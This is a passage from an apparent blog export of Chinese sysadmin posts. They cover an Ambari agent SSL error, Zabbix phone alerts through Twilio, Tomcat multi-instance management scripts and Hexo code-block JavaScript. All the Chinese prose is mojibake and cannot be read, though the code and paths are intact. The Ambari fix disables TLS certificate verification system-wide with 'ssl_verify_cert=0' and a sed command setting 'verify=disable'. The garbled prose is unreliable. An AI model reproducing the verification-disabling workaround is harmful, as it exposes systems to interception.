    <content type="text"><![CDATA[ÂêØÂä®Ambari web ÁïåÈù¢ÊòæÁ§∫ÊúçÂä°Heartbeat Lost, Êü•ÁúãAmbari agentÊó•ÂøóÊä•Èîô 0x00AgentÊä•ÈîôÂ¶Ç‰∏ã/var/log/ambari-agent/ambari-agent.logERROR 2015-09-23 09:47:07,402 NetUtil.py:77 - [Errno 8] _ssl.c:492: EOF occurred in violation of protocolERROR 2015-09-23 09:47:07,402 NetUtil.py:78 - SSLError: Failed to connect. Please check openssl library versions.Refer to: https://bugzilla.redhat.com/show_bug.cgi?id=1022468 for more details.WARNING 2015-09-23 09:47:07,402 NetUtil.py:105 - Server at https://ambari-server:8440is not reachable, sleeping for 10 seconds...WARNING 2015-09-23 09:47:07,402 NetUtil.py:105 - Server at https://ambari-server:8440is not reachable, sleeping for 10 seconds... 0x01Ëß£ÂÜ≥ÂäûÊ≥ï1. ÈÖçÁΩÆAmbari-agentÂº∫Âà∂httpsÁâàÊú¨‰∏∫TLSv1_2ÁºñËæë/etc/ambari-agent/conf/ambari-agent.ini„ÄÇ Ê≠§‰∏∫sedÊ∑ªÂä†ÂëΩ‰ª§sed -i /\[security\]/a\/force_https_protocol=PROTOCOL_TLSv1_2 /etc/ambari-agent/conf/ambari-agent.ini Âú®[security]ÂêéÊ∑ªÂä†Â¶Ç‰∏ãÂÜÖÂÆπ: /etc/ambari-agent/conf/ambari-agent.ini123456789[security]force_https_protocol=PROTOCOL_TLSv1_2keysdir=/var/lib/ambari-agent/keysserver_crt=ca.crtpassphrase_env_var_name=AMBARI_PASSPHRASEssl_verify_cert=0credential_lib_dir=/var/lib/ambari-agent/cred/libcredential_conf_dir=/var/lib/ambari-agent/cred/confcredential_shell_cmd=org.apache.hadoop.security.alias.CredentialShell 2. Êõ¥ÊîπpythonÈÖçÁΩÆÂÖ≥Èó≠httpsÈ™åËØÅÁºñËæë/etc/python/cert-verification.cfg Êõ¥Êîπ‰∏∫verify=disable Ê≠§‰∏∫sedÊõ¥ÊîπÂëΩ‰ª§sed -i 's/verify=.*/verify=disable/g' /etc/python/cert-verification.cfg /etc/python/cert-verification.cfg123[https]verify=platform_defaultverify=disable 0x02 ÈáçÂêØagentservice ambari-agent restart Ëß£ÂÜ≥ 0x03 ÂéüÂõ†Áî±‰∫éambari server Á´Ø‰ΩøÁî®JDK1.7ÂêØÂä®Ôºå ‰∏éopensslÂ≠òÂú®BugÔºå Êõ¥ÊîπÂ¶Ç‰∏äÈÖçÁΩÆÊñá‰ª∂ÔºåÊõ¥ÊîπsslÁâàÊú¨ÔºåÂÖ≥Èó≠python httpsÊ†°È™å.]]></content>
      <categories>
        <category>ErrorNote</category>
      </categories>
      <tags>
        <tag>Ambari</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ZabbixÁîµËØùÊä•Ë≠¶]]></title>
    <url>%2F2018%2F07%2F06%2Fzabbix-alarm-phone%2F</url>
    <content type="text"><![CDATA[Zabbix ‰ΩøÁî® twilio ËøõË°åÂÖçË¥πÁîµËØùÊä•Ë≠¶, ÂÖçÈô§‰ºÅ‰∏öËÆ§ËØÅÁπÅÁêêÊ≠•È™§ 0x00 Ê≥®ÂÜå twilio Ëé∑Âèñ api Ë∞ÉÁî®key1. Ê≥®ÂÜåË¥¶Âè∑ Ê≥®ÂÜåÂú∞ÂùÄ Twilio-SignUp ÈúÄË¶ÅÁøªÂ¢ô ÂØÜÁ†ÅËá≥Â∞ë14‰∏™Â≠óÁ¨¶Ôºå‰∏çÈúÄË¶ÅÁâπÊÆäÂ≠óÁ¨¶ ÈÄöËøáÂêé ÈÄâÊã©‰∏≠ÂõΩÂå∫, È™åËØÅÊâãÊú∫Âè∑ ÂàõÂª∫È°πÁõÆÂêçÁß∞(Èöè‰æøÂÜô) 2. Ëé∑ÂèñÁΩëÁªúÂè∑Á†Å ÂàùÂßãÈÖçÁΩÆÂú∞ÂùÄ ÈÄâÊã©Â¶Ç‰∏ãÈÄâÈ°π: ËÆ∞‰ΩèËøô‰∏™Âè∑Á†ÅÁªìÊûú+18652052853ÂêéÊúü‰ºö‰ΩøÁî® Âà∞Ê≠§Â∞±‰∏çÁî®ÁªßÁª≠Ëµ∞Ââ©‰∏ãÁöÑÂá†Ê≠•‰∫Ü ÂÖ∂‰ªñËá™ÂÆö‰πâÁîµËØùËÆæÁΩÆ(ÈªòËÆ§‰∏çÈúÄË¶ÅÈÖçÁΩÆ) 0x01 ÁºñËæëzabbixË∞ÉÁî®APIËÑöÊú¨ Ëé∑ÂèñAPI_KeyÂú∞ÂùÄ Dashboard &gt;&gt; Settings &gt;&gt; General Ëé∑ÂèñACCOUNT SID, AUTH TOKEN Ê≥®ÊÑè: ËØïÁî®Ë¥¶Âè∑Âè™ËÉΩÊâìÁªô Ê≥®ÂÜåÊó∂‰ΩøÁî®ÁöÑÊâãÊú∫Âè∑!! Êõ¥ÊîπÊñá‰ª∂Â±û‰∏ªÂèäÊùÉÈôêchown zabbix:zabbix &amp;&amp; chmod +x zabbix_phone.py zabbix/alertscripts/zabbix_phone.py12345678910111213141516171819# -*- coding: utf-8 -*-#!/usr/bin/env pythonfrom twilio.rest import Client# Your Account Sid and Auth Token from twilio.com/consoleaccount_sid = 'your_sid'auth_token = 'your_token'client = Client(account_sid, auth_token)call = client.calls.create( url='https://demo.twilio.com/welcome/voice/', #Ê≥®ÂÜå‰ΩøÁî®ÁöÑÊâãÊú∫Âè∑ to='+8611111', #‰∏äÈù¢Ëé∑ÂèñÂà∞ÁöÑÁΩëÁªúÁîµËØùÂè∑Á†Å from_='+19387770820' )print(call.sid) ÊâßË°åÊñá‰ª∂ÊµãËØï, ËøîÂõû‰∏ÄÊÆµidË°®Á§∫ÊàêÂäü, Êé•Âà∞ÁîµËØù 0x02 ÈÖçÁΩÆzabbix1. Ê∑ªÂä†Êä•Ë≠¶Â™í‰ªã 2. ËøûÊé•Âà∞Áî®Êà∑ 3. Ê∑ªÂä†Âà∞Âä®‰Ωú Ëá≥Ê≠§zabbixÁîµËØùÊä•Ë≠¶ÈÖçÁΩÆÂÆåÊàê, Â¶ÇÊûúÈúÄË¶ÅÂÖçË¥πÊâìÁªôÂ§ö‰∏™Áî®Êà∑, ÂèØ‰ª•Ê≥®ÂÜåÂ§ö‰∏™Ë¥¶Âè∑,Ê∑ªÂä†Â§ö‰∏™Â™í‰ªã ÁÑ∂Âêé ÁªëÂÆöÂà∞Âêå‰∏Ä‰∏™Âä®‰Ωú‰∏≠.]]></content>
      <categories>
        <category>Ëá™Âä®ÂåñËøêÁª¥</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TomcatÂçïÊú∫Â§öÂÆû‰æãÈÉ®ÁΩ≤ÂèäÁÆ°ÁêÜ]]></title>
    <url>%2F2018%2F06%2F28%2Ftomcat-multiple%2F</url>
    <content type="text"><![CDATA[ÂçïÂè∞Êú∫Âô®ÈÉ®ÁΩ≤Â§ö‰∏™ Tomcat, ÊØè‰∏™TomcatÈÉ®ÁΩ≤Áã¨Á´ãÊúçÂä°,Tomcat‰πãÈó¥ÂêØÂÅú‰∫í‰∏çÂΩ±Âìç ‰∏çË¶ÅÈóÆÊàë‰∏∫‰ªÄ‰πàÊúâËøô‰∏™ÈúÄÊ±Ç, Â§çÂà∂Á≤òË¥¥Â∞±ÊòØÂπ≤ 0x00 ÂçïÊú∫Â§öÂÆû‰æãÊ¶ÇËø∞ Â§ßÊ¶ÇÁöÑÁõÆÂΩïÁªìÊûÑ: CATALINA_HOME ‰∏∫TomcatÂ∫îÁî®Á®ãÂ∫èËøêË°åÁ®ãÂ∫èÂèäÊâÄÈúÄ‰æùËµñ CATALINA_BASE Âç≥Êàë‰ª¨Âç≥Â∞ÜÈÉ®ÁΩ≤ÁöÑÁ®ãÂ∫è ÊâãÂä®Êõ¥ÊîπÂ¶Ç‰∏ãÂ∑•‰ΩúÁõÆÂΩï: ËøôÊòØÊàëËá™Â∑±‰∏™ÂÑøÊï¥ÁöÑÂàùÂßãÁõÆÂΩïÁªìÊûÑ download12345678910war_apps #ÊâãÂä®ÂàõÂª∫Áî®Êù•Â≠òÊîæ‰∏ãËΩΩÂ•ΩÁöÑwarÂåÖÊñá‰ª∂tomcat #CATALINA_HOME‚îú‚îÄ‚îÄ bin‚îú‚îÄ‚îÄ INIT_APPS_FILE #CATALINA_BASE‚îÇ ‚îú‚îÄ‚îÄ conf‚îÇ ‚îú‚îÄ‚îÄ logs‚îÇ ‚îú‚îÄ‚îÄ temp‚îÇ ‚îú‚îÄ‚îÄ webapps‚îÇ ‚îî‚îÄ‚îÄ work‚îî‚îÄ‚îÄ lib ÁÑ∂ÂêéÂë¢Ê≠£Â∏∏ÁöÑÊÄùË∑ØÂ∞±ÊòØÈÖçÁΩÆÊØè‰∏™APPÁöÑserver.xmlÁ´ØÂè£: 1234- Server PortÔºöËØ•Á´ØÂè£Áî®‰∫éÁõëÂê¨ÂÖ≥Èó≠tomcatÁöÑshutdownÂëΩ‰ª§ÔºåÈªòËÆ§‰∏∫8005- Connector PortÔºöËØ•Á´ØÂè£Áî®‰∫éÁõëÂê¨HTTPÁöÑËØ∑Ê±ÇÔºåÈªòËÆ§‰∏∫8080- AJP PortÔºöËØ•Á´ØÂè£Áî®‰∫éÁõëÂê¨AJPÔºà Apache JServ Protocol ÔºâÂçèËÆÆ‰∏äÁöÑËØ∑Ê±ÇÔºåÈÄöÂ∏∏Áî®‰∫éÊï¥ÂêàApache ServerÁ≠âÂÖ∂‰ªñHTTPÊúçÂä°Âô®ÔºåÈªòËÆ§‰∏∫8009- Redirect PortÔºöÈáçÂÆöÂêëÁ´ØÂè£ÔºåÂá∫Áé∞Âú®ConnectorÈÖçÁΩÆ‰∏≠ÔºåÂ¶ÇÊûúËØ•Connector‰ªÖÊîØÊåÅÈùûSSLÁöÑÊôÆÈÄöhttpËØ∑Ê±ÇÔºåÈÇ£‰πàËØ•Á´ØÂè£‰ºöÊää https ÁöÑËØ∑Ê±ÇËΩ¨ÂèëÂà∞Ëøô‰∏™Redirect PortÊåáÂÆöÁöÑÁ´ØÂè£ÔºåÈªòËÆ§‰∏∫8443Ôºõ Â∫îÁî®Â§™Â§ö‰Ω†ÈöæÈÅìË¶Å‰∏Ä‰∏™‰∏™ÊâãÂä®Êîπ? no no no! ‰∏äËÑöÊú¨ 0x01 Ëá™Âä®ÈÉ®ÁΩ≤ÁÆ°ÁêÜÈÖçÁΩÆÈúÄË¶ÅÊääÂ∫îÁî®warÂåÖ‰º†Âà∞ÂèØ‰∏ãËΩΩ‰ΩçÁΩÆ,Êù•Áî®‰∫éÂ∫îÁî®ÂàÜÂèë,ÊàëËøôÈáåÊòØÁõ¥Êé•‰º†Âà∞‰∫ÜÈòøÈáå‰∫ëÁöÑossÊ°∂Èáå 1.Ê∑ªÂä†tomcatÊõ¥Êñ∞ÂêØÂÅúÊéßÂà∂ËÑöÊú¨ÈúÄË¶ÅÂÆâË£Öunzip yum -y install unzip manage.shÈúÄË¶ÅÊîæÂú®ËøôÈáå,‰πüÂèØ‰ª•Ëá™ÂÆö‰πâÊîπ‰ª£Á†Å1234567891011war_apps #ÊâãÂä®ÂàõÂª∫Áî®Êù•Â≠òÊîæ‰∏ãËΩΩÂ•ΩÁöÑwarÂåÖÊñá‰ª∂tomcat #CATALINA_HOME‚îú‚îÄ‚îÄ bin‚îú‚îÄ‚îÄ manage.sh‚îú‚îÄ‚îÄ INIT_APPS_FILE #CATALINA_BASE‚îÇ ‚îú‚îÄ‚îÄ conf‚îÇ ‚îú‚îÄ‚îÄ logs‚îÇ ‚îú‚îÄ‚îÄ temp‚îÇ ‚îú‚îÄ‚îÄ webapps‚îÇ ‚îî‚îÄ‚îÄ work‚îî‚îÄ‚îÄ lib ËìùËâ≤ÂùóÈúÄË¶ÅÊ†πÊçÆÂÆûÈôÖÊÉÖÂÜµËá™ÂÆö‰πâ, Â∫îÁî®ÂêçÁß∞, ÂíåwarÂåÖ‰∏ãËΩΩÂú∞ÂùÄ‰∏çÈúÄË¶ÅÂÜô,ÂêéÈù¢ÁöÑpythonÊÄªÊéßÂà∂Âè∞‰ºöËá™Âä®ÂàÜÈÖç manage.sh123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#!/bin/sh# Author: Kionf# description: ÂêØÂä®tomcatÂ§öÂÆû‰æã.# PATH=/opt/op/java/jdk1.8.0_172/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin# Â∫îÁî®ÂêçÁß∞app=# warÂåÖ‰∏ãËΩΩÂú∞ÂùÄwar_url=soft_dir="/opt/op"download_war_file="$&#123;soft_dir&#125;/war_apps/$&#123;app&#125;.war"export CATALINA_BASE="$&#123;soft_dir&#125;/tomcat/$app"export CATALINA_HOME="$&#123;soft_dir&#125;/tomcat"export JVM_OPTIONS="-Xms528m -Xmx812m -Xmn328m"[ -d "$&#123;soft_dir&#125;/war_apps" ] || mkdir $&#123;soft_dir&#125;/war_apps[ `which unzip` ] || yum -y -q install unzip &gt;/dev/null 2&gt;&amp;1check()&#123; PID=`ps aux|grep java|grep -w $&#123;CATALINA_BASE&#125;|awk '&#123;print $2&#125;'` if [ -n "$PID" ];then echo -e "\033[94m $app is running PID:$PID" running=`netstat -ntlp|grep $PID|grep 127.0.0.1` if [ -n "$running" ];then echo -e "\033[92m $app is provide services\033[0m " else echo -e "\033[93m $app is running but not provide services\033[0m" fi return 0 else echo -e "\033[91m $app is dead\033[0m " return 1 fi&#125;start() &#123; check if [ $? -eq 1 ];then echo -e "\033[94m Start $app \033[0m" $CATALINA_HOME/bin/startup.sh &gt;/dev/null 2&gt;&amp;1 fi&#125;stop() &#123; check if [ $? -eq 0 ];then echo -e "\033[94m Stop $app\033[0m" $CATALINA_HOME/bin/shutdown.sh &gt;/dev/null 2&gt;&amp;1 kill -9 $PID fi&#125;update() &#123; echo "‰∏ãËΩΩÊñá‰ª∂" wget $&#123;war_url&#125; -O $&#123;download_war_file&#125; &gt; /dev/null 2&gt;&amp;1 if [ $? -eq 0 ];then cd $&#123;CATALINA_BASE&#125;/webapps/*/; unzip -q -o $&#123;download_war_file&#125; &gt;/dev/null 2&gt;&amp;1 fi&#125;log() &#123; tailf $&#123;CATALINA_BASE&#125;/logs/catalina.out&#125;if [ $# != "0" ];then case "$1" in start) start ;; stop) stop ;; restart) stop start ;; status) check ;; upgrade) stop update start ;; log) log ;; *) echo $"Usage: $0 &#123;start|stop|restart|status|upgrade|log&#125;" exit 1 ;; esacelse start logfi 2.Ê∑ªÂä†ÊÄªÊéßÂà∂Âè∞ËÑöÊú¨ ÊàëÂ∞±ÊîæÂú®‰∫Ü/usr/local/bin‰∏ã, chmod +x /usr/local/bin/tomcat_manager ËìùËâ≤ÈÉ®ÂàÜÈúÄË¶ÅÊ†πÊçÆËá™Â∑±ÈúÄÊ±ÇÊõ¥Êîπ (ÊîØÊåÅpython2) /usr/local/bin/tomcat_manager123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#! /usr/bin/env python# -*- coding: utf-8 -*-# @Time : 2018/5/23 15:18# @Author : Kionf# @FileName: tomcat_manager.py## ÂàùÂßãÈÖçÁΩÆÂπ∂ÁÆ°ÁêÜÂçï‰æãtomcatÂ§öÂ∫îÁî®#import osimport subprocessimport sysimport shutil# PATH = os.getcwd()PATH = "/opt/op/tomcat" #TomcatÁõÆÂΩïshell_script = os.path.join(PATH, "manage.sh") #Êõ¥Êñ∞ÂêØÂÅúÁÆ°ÁêÜËÑöÊú¨INIT_FILES = os.path.join(PATH, "INIT_APPS_FILE")bucket = "https://oss.aliyuncs.com/tomcat_app/" # webapp‰∏ãËΩΩÂú∞ÂùÄconfig_data = &#123; # Â∫îÁî®Âêç: [ServerPort, ConnectPort, AJPPort, RedirectPort, ] 'Application': ['8201', '8101', '8301', '8401', 'BaseApplication.war'], 'BaseNotify_Service': ['8202', '8102', '8302', '8402', 'BaseNotify_Service.war'], 'BaseUserCenter_Service': ['8203', '8103', '8303', '8403', 'BaseUserCenter_Service.war'],&#125;def customize_print(msg, stat=0): if stat == 1: print("\033[91m [ERROR]: %s \033[0m" % msg) elif stat == 0: print("\033[92m [INFO]: %s \033[0m" % msg) elif stat == 2: print("\033[93m [DEBUG]: %s \033[0m" % msg)class TomcatAppsManage: def __init__(self, webapp): self.name = webapp self.app_config = config_data[self.name] self.manage_shell_file = os.path.join(PATH, self.name, self.name) self.server_port, self.conn_port, self.ajp_port, self.redirect_port, self.app_war_name = self.app_config self.app_download_url = bucket + self.app_war_name self.config_file = os.path.join(PATH, self.name, 'conf/server.xml') self.webapp_dir = os.path.join(PATH, self.name) def create_app(self): """ ÂàõÂª∫app :return: """ if not os.path.exists(self.webapp_dir): customize_print("ÂàõÂª∫APP: %s" % self.name) shutil.copytree(INIT_FILES, self.webapp_dir) os.mkdir(os.path.join(self.webapp_dir, "webapps", self.name.lower())) def config_app_port(self): customize_print("Ê≠£Âú®‰øÆÊîπAPPÔºö%s ÈÖçÁΩÆ" % self.name) change_port = &#123; 'ServerPort': "sed -i s'#Server port=\"[0-9]*\"#Server port=\"" + self.server_port + "\"#'g " + self.config_file, 'ConnPort': "sed -i s'#Connector port=\"[0-9]*\" protocol=\"HTTP/1.1\"#Connector port=\"" + self.conn_port + "\" protocol=\"HTTP/1.1\"#'g " + self.config_file, 'RedirectPort': "sed -i s'#redirectPort=\"[0-9]*\"#redirectPort=\"" + self.redirect_port + "\"#'g " + self.config_file, 'AjpPort': "sed -i s'#Connector port=\"[0-9]*\" protocol=\"AJP/1.3\"#Connector port=\"" + self.ajp_port + "\" protocol=\"AJP/1.3\"#'g " + self.config_file, &#125; for port in change_port.keys(): # customize_print("‰øÆÊîπ %s Á´ØÂè£" % port) os.system(change_port[port]) def config_app_manage_shell(self): customize_print("%s Ê∑ªÂä†ÁÆ°ÁêÜËÑöÊú¨" % self.name) copy_shell_script = 'cp -f ' + shell_script + ' ' + self.manage_shell_file os.system(copy_shell_script) config_script_app_name = "sed -i 's/app=/app=\"" + self.name + "\"/' " + self.manage_shell_file os.system(config_script_app_name) config_script_war_url = "sed -i 's#war_url=#war_url=\"" + self.app_download_url + "\"#' " + self.manage_shell_file os.system(config_script_war_url) def status_app(self): """ :return: 0Êèê‰æõÊúçÂä°Ôºå1ÂÅúÊ≠¢Ôºå2Êú™Êèê‰æõÊúçÂä° """ try: result = subprocess.check_output(['sh', self.manage_shell_file, 'status']) except subprocess.CalledProcessError as e: result = e.output if 'run' in result: if 'is provide services' in result: customize_print("Â∫îÁî® %s ÊàêÂäüÂêØÂä®Âπ∂Êèê‰æõÊúçÂä°" % self.name) return 0 elif 'but' in result: customize_print("Â∫îÁî® %s ËøõÁ®ãÂ≠òÂú®‰ΩÜÊú™Êèê‰æõÊúçÂä°" % self.name, 2) return 2 else: customize_print("Â∫îÁî® %s ‰ª•ÂÅúÊ≠¢" % self.name, 1) return 1 def manage(self, operate): os.system('sh %s %s' % (self.manage_shell_file, operate)) def init(self): self.create_app() self.config_app_port() self.config_app_manage_shell() self.manage("upgrade") self.manage("stop") def restart(self): self.manage("stop") self.manage("start") def start(self): self.manage("start") def stop(self): self.manage("stop") def log(self): self.manage("log") def upgrade(self): self.lock_config_file() self.manage("upgrade") def lock_config_file(self): cmd = 'find ' + self.webapp_dir + ' -name db*properties -o -name config_base_*|xargs chattr +i &gt;/dev/null 2&gt;&amp;1' customize_print("ÈîÅÈÖçÁΩÆÊñá‰ª∂", 2) os.system(cmd) def unlock_config_file(self): cmd = 'find ' + self.webapp_dir + ' -name db*properties -o -name config_base_*|xargs chattr -i &gt;/dev/null 2&gt;&amp;1' customize_print("Ëß£ÈîÅÈÖçÁΩÆÊñá‰ª∂", 2) os.system(cmd)def dash_board(apps, operate): """ ‰∏ªÁÆ°ÁêÜÁ®ãÂ∫èÔºåË∞ÉÁî® :param operate: Â∫îÁî®Êìç‰Ωú :param apps: apps ‰∏∫list """ for app in apps: app_obj = TomcatAppsManage(app) main_dict = &#123; "init": app_obj.init, "shell": app_obj.config_app_manage_shell, "status": app_obj.status_app, "start": app_obj.start, "stop": app_obj.stop, "restart": app_obj.restart, "upgrade": app_obj.upgrade, "log": app_obj.log, "lock": app_obj.lock_config_file, "unlock": app_obj.unlock_config_file, &#125; try: main_dict[operate]() except KeyError as e: customize_print(help_msg)help_msg = """‰ΩøÁî®ÊñπÊ≥ïÔºö 1 log all status ÁÆ°ÁêÜÂ∫îÁî®ÁºñÂè∑ Êìç‰ΩúÊìç‰ΩúÔºö lock ÈîÅÈÖçÁΩÆÊñá‰ª∂ unlock Ëß£ÈîÅÈÖçÁΩÆÊñá‰ª∂ init ÈÖçÁΩÆtomcatÁõëÂê¨Á´ØÂè£ shell ÈÖçÁΩÆwebappÊéßÂà∂ËÑöÊú¨ statusÔºåstartÔºårestart, logÔºåupgradeÔºåstop Â∫îÁî®Êìç‰Ωú"""def main(): app_list = [] for index, app_name in enumerate(config_data, 1): print "\033[94m %s: %s \033[0m" % (index, app_name) app_list.append(app_name) choice = raw_input("ËæìÂÖ•Ë¶ÅÁÆ°ÁêÜÁöÑÊúçÂä°: ") try: app_index = choice.split()[0] operate = choice.split()[1] if app_index.isdigit(): app_index = int(app_index) if len(app_list) &gt;= app_index &gt; 0: app_name = app_list[app_index - 1] dash_board(app_name.split(), operate) elif app_index == "all": dash_board(app_list, operate) except ValueError and IndexError: customize_print("ÂèÇÊï∞ËæìÂÖ•ÈîôËØØ", 1) customize_print(help_msg)if __name__ == '__main__': try: dash_board(sys.argv[1].split(), sys.argv[2]) except IndexError: try: while True: main() except KeyboardInterrupt: customize_print("Bye!") 0x02 ÂºÄÂßãÂàùÂßãÂåñÈÉ®ÁΩ≤ÊâßË°åtomcat_manager all init Ëá™Âä®ÂàùÂßãÂåñÈÉ®ÁΩ≤ÊâÄÊúâÈ°πÁõÆ, ÂÖ∂‰ªñÂÖ∑‰Ωì‰ΩøÁî®ÊñπÊ≥ïËßÅÂ∏ÆÂä©‰ø°ÊÅØ]]></content>
      <categories>
        <category>Linux</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo next‰ª£Á†ÅÁâáÊÆµÊ∑ªÂä†‰ª£Á†ÅÂùóÂ§çÂà∂ÂíåÈïø‰ª£Á†ÅËá™Âä®Â±ïÂºÄ]]></title>
    <url>%2F2018%2F06%2F28%2Fblog-next%2F</url>
    <content type="text"><![CDATA[Ê∑ªÂä†Èº†Ê†áÁßªÂä®Âà∞Èïø‰ª£Á†ÅÂùó, Ëá™Âä®Â±ïÂºÄ. ‰ª£Á†ÅÂùóÂ§çÂà∂ÊåâÈíÆÂèäÂÆöÂà∂ 0x00 Ê∑ªÂä†Á¨¨‰∏âÊñπjsÊèí‰ª∂clipboard.js ‰∏ãËΩΩ ./themes/next/source/lib/zclip/clipboard.min.js Êñ∞Â¢û 0x01 ÊèíÂÖ•Ëá™ÂÆö‰πâjavascriptÊñ∞Â¢ûcustom.jsÊñá‰ª∂, ÁõÆÂΩïÂ¶Ç‰∏ã ./themes/next/source/js/src/custom.js Êñ∞Â¢û ./themes/next/source/js/src/custom.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246var browserHeight = document.documentElement.clientHeight || document.body.clientHeight;var scrollTop = document.documentElement.scrollTop || document.body.scrollTop;function createCopyBtns() &#123; // ÂàõÂª∫Â§çÂà∂button ÂØπË±° var $figure = $("figure .figcode"); if ($figure.length &gt; 0) &#123; $(".post-body").before('&lt;div id="copyBtn" &gt;&lt;span id="imgCopy" &gt;&lt;i class="fa fa-paste fa-fw"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id="imgSuccess" style="display: none;color: #6FB76F;"&gt;&lt;i class="fa fa-check-circle fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/span&gt;'); $figure.append('&lt;div class="codePinBtn"&gt;&lt;img id="imgSuccess" src="/article_images/png/Pin_green.png" style="border:none; width: 24px;"&gt;&lt;/div&gt;'); &#125; var $codeArea = $("figure .code"); if ($codeArea.length &gt; 0) &#123; function changeToSuccess(item) &#123; $imgOK = $("#copyBtn").find("#imgSuccess"); if ($imgOK.css("display") == "none") &#123; $imgOK.css(&#123; opacity: 0, display: "block" &#125;); $imgOK.animate(&#123; opacity: 1 &#125;, 1000); setTimeout(function () &#123; $imgOK.animate(&#123; opacity: 0 &#125;, 2000); &#125;, 2000); setTimeout(function () &#123; $imgOK.css("display", "none"); &#125;, 4000); &#125; ; &#125;; var clipboard = new ClipboardJS('#copyBtn', &#123; // ÂÆöÂà∂Á≠õÈÄâÂ§çÂà∂ target: function () &#123; var node = document.querySelector("[copyFlag]"); var child = node.querySelector(".diff-deletion"); if (child != null) &#123; var pre = node.querySelector("pre").cloneNode(true); child = pre.querySelector(".diff-deletion"); while (child != null) &#123; pre.removeChild(child) child = pre.querySelector(".diff-deletion"); &#125; var node = document.getElementById('tmpcopy'); if (node == null) &#123; node = document.createElement('div'); node.id = 'tmpcopy'; node.style.position = 'fixed'; node.style.width = '0'; node.style.height = '0'; document.body.appendChild(node); &#125; node.innerHTML = ''; node.appendChild(pre); &#125; return node; &#125;, isSupported: function () &#123; alert(this.support); return document.querySelector("[copyFlag]"); &#125; &#125;); clipboard.on('success', function (e) &#123; e.clearSelection(); changeToSuccess(e); var node = document.getElementById("tmpcopy"); if (node != null) node.innerHTML = ''; &#125;); clipboard.on('error', function (e) &#123; console.error('Action:', e.action); console.error('Trigger:', e.trigger); &#125;); $("#copyBtn").hover( function () &#123; $(this).stop(); $(this).css("opacity", 1); &#125;, function () &#123; $(this).animate(&#123; opacity: 0 &#125;, 2000); &#125; ); &#125;&#125;function FigureHover(figure) &#123; // ÁßªÂä®Èº†Ê†áÊãâ‰º∏ÊòæÁ§∫‰ª£Á†Å var block = $(figure).attr("block"); if (block != 1) &#123; var codeArea = $(figure).find(".code")[0]; var width_code = codeArea.clientWidth; var width_Scroll = codeArea.scrollWidth; var width_Margin = -parseInt($(figure).css("marginRight")); $codePinBtn = $(figure).find(".codePinBtn"); var width_Hide = width_Scroll - (width_code - width_Margin); if (width_Hide &gt; 0) &#123; $(figure).stop(); $codePinBtn.stop(); var width_Main = $("#main").width(); var width_Base = $(".main-inner").width(); var width_Blank = (width_Main - width_Base) / 2 - 10; if (width_Blank &gt; 0) &#123; if (width_Hide &lt; width_Blank) &#123; width_Margin = width_Hide; //Á©∫ÁôΩÂå∫ÂüüË∂≥Â§üÁõ¥Êé•ÊòæÁ§∫ ÂÖ®ÈÉ® &#125; else &#123; width_Margin = width_Blank * 0.8; &#125; $(figure).animate(&#123;marginRight: -width_Margin&#125;); $codePinBtn.animate(&#123;opacity: 1&#125;); &#125; &#125; ; &#125; ;&#125;;function FigureHoverOut(figure) &#123; // Èº†Ê†áÁßªÈô§‰ª£Á†ÅÂùó $("#copyBtn").animate(&#123; opacity: 0 &#125;, 2000); var block = $(figure).attr("block"); if (block != 1) &#123; $(figure).stop(); $(figure).animate(&#123;marginRight: "0"&#125;); var $codePinBtn = $(figure).find(".codePinBtn"); $codePinBtn.stop(); $codePinBtn.css(&#123;opacity: 0&#125;); &#125;&#125;;$("figure").hover( // Èº†Ê†áÁßªÂÖ•‰ª£Á†ÅÂùó function () &#123; FigureHover(this); var block = $(this).attr("block"); //-------Èº†Ê†áÊ¥ªÂä®Âú®‰ª£Á†ÅÂùóÂÜÖ //ÁßªÈô§‰πãÂâçÂê´ÊúâÂ§çÂà∂Ê†áÂøó‰ª£Á†ÅÂùóÁöÑ copyFlag $("[copyFlag]").removeAttr("copyFlag"); //Âú®Êñ∞ÁöÑÔºàÂΩìÂâçÈº†Ê†áÊâÄÂú®‰ª£Á†ÅÂå∫Ôºâ‰ª£Á†ÅÂùóÊèíÂÖ•Ê†áÂøóÔºöcopyFlag $(this).find(".code").attr("copyFlag", 1); //Ëé∑ÂèñÂ§çÂà∂ÊåâÈíÆ $copyBtn = $("#copyBtn"); if ($copyBtn.lenght != 0) &#123; //Ëé∑ÂèñÂà∞ÊåâÈíÆÁöÑÂâçÊèê‰∏ãËøõË°å‰∏Ä‰∏ãÊìç‰Ωú //ÂÅúÊ≠¢ÊåâÈíÆÂä®ÁîªÊïàÊûú //ËÆæÁΩÆ‰∏∫ ÊòæÁ§∫Áä∂ÊÄÅ //‰øÆÊîπ Â§çÂà∂ÊåâÈíÆ ‰ΩçÁΩÆÂà∞ ÂΩìÂâç‰ª£Á†ÅÂùóÂºÄÂßãÈÉ®‰Ωç //ËÆæÁΩÆ‰ª£Á†ÅÂùó Â∑¶‰æß‰ΩçÁΩÆ $copyBtn.stop(); $copyBtn.css("opacity", 0.8); $copyBtn.css("display", "block"); $copyBtn.css("top", parseInt($copyBtn.css("top")) + $(this).offset().top - $copyBtn.offset().top + 3); $copyBtn.css("left", -$copyBtn.width() - 3); &#125; &#125;, function () &#123; FigureHoverOut(this); 